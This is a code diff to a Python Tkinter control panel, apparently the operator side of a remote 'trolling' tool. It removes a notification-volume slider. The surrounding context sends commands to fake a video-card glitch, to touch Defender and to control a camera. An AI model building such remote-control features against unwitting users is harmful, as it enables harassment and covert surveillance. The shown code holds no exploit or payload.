@@ -743,26 +743,6 @@ class ModernControlPanel:
         row_glitch.pack(fill=tk.X, pady=2)
         tk.Button(row_glitch, text="📺 ОТВАЛ ВИДЕОКАРТЫ / МАТРИЧНЫЙ ГЛИТЧ ⚡", font=("Segoe UI", 9, "bold"), bg="#eba0ac", fg="#11111b", bd=0, command=lambda: self.send_command("TROLL:GLITCH")).pack(fill=tk.X, expand=True, padx=2)
 
-        # Громкость уведомлений со слайдером (0% - 200%) и пресетами
-        vol_frame = tk.Frame(troll_frame, bg=self.bg_color, padx=10, pady=8, bd=1, relief=tk.SOLID)
-        vol_frame.pack(fill=tk.X, pady=(6, 4))
-        
-        vol_top = tk.Frame(vol_frame, bg=self.bg_color)
-        vol_top.pack(fill=tk.X)
-        tk.Label(vol_top, text="🔊 ГРОМКОСТЬ УВЕДОМЛЕНИЙ (Discord, TG, Steam):", font=("Segoe UI", 9, "bold"), bg=self.bg_color, fg=self.accent_blue).pack(side=tk.LEFT)
-        self.notif_vol_label = tk.Label(vol_top, text="200%", font=("Segoe UI", 9, "bold"), bg=self.bg_color, fg=self.accent_yellow)
-        self.notif_vol_label.pack(side=tk.RIGHT)
-        
-        # Кнопки быстрых пресетов громкости
-        presets_frame = tk.Frame(vol_frame, bg=self.bg_color)
-        presets_frame.pack(fill=tk.X, pady=(4, 2))
-        vol_presets = [("0% 🔇", 0), ("50% 🔉", 50), ("100% 🔊", 100), ("150% 📢", 150), ("200% 💥", 200)]
-        for text, v in vol_presets:
-            tk.Button(presets_frame, text=text, font=("Segoe UI", 8, "bold"), bg=self.panel_color, fg=self.text_color, bd=0, padx=6, pady=2,
-                      command=lambda val=v: self.set_notif_vol(val)).pack(side=tk.LEFT, expand=True, fill=tk.X, padx=1)
-
-        self.notif_vol_slider = ttk.Scale(vol_frame, from_=0, to=200, value=200, orient=tk.HORIZONTAL, command=self.on_notif_vol_change)
-        self.notif_vol_slider.pack(fill=tk.X, pady=(4, 0))
 
         # Ряд 6: Батарея + Defender
         row_troll_1 = tk.Frame(troll_frame, bg=self.panel_color)
@@ -1071,13 +1051,7 @@ class ModernControlPanel:
             fps_val = command.split(":")[1]
             txt = "СБРОС FPS (БЕЗ ОГРАНИЧЕНИЙ)" if fps_val == "0" else f"FPS ОГРАНИЧЕН: {fps_val} FPS"
             self.cam_header.config(text=f"КАМЕРА: {txt} ⏱️", fg="#fab387")
-        elif command.startswith("SET_NOTIF_VOLUME:"):
-            vol_val = command.split(":")[1]
-            try:
-                pct = int(float(vol_val) * 100)
-                self.troll_header.config(text=f"ТРОЛЛИНГ: ГРОМКОСТЬ УВЕДОМЛЕНИЙ {pct}% 🔊", fg="#f9e2af")
-            except:
-                pass
+
         elif command == "TAPE_STOP":
             self.audio_header.config(text="ЗВУК: ЗАЖЕВАЛО ПЛЕНКУ / TAPE STOP 🛑", fg="#fab387")
         elif command == "REVERB_ON":
@@ -1117,20 +1091,7 @@ class ModernControlPanel:
         fps_int = int(self.fps_slider.get())
         self.set_fps_target(fps_int)
 
-    def set_notif_vol(self, vol_pct):
-        self.notif_vol_slider.set(vol_pct)
-        self.notif_vol_label.config(text=f"{int(vol_pct)}%")
-        self.send_command(f"SET_NOTIF_VOLUME:{vol_pct / 100.0:.2f}")
 
-    def on_notif_vol_change(self, val):
-        vol_int = int(float(val))
-        self.notif_vol_label.config(text=f"{vol_int}%")
-        if getattr(self, "_vol_timer", None):
-            try:
-                self.root.after_cancel(self._vol_timer)
-            except:
-                pass
-        self._vol_timer = self.root.after(35, lambda: self.send_command(f"SET_NOTIF_VOLUME:{vol_int / 100.0:.2f}"))
 
     def on_radar_click(self, event):
         x = event.x
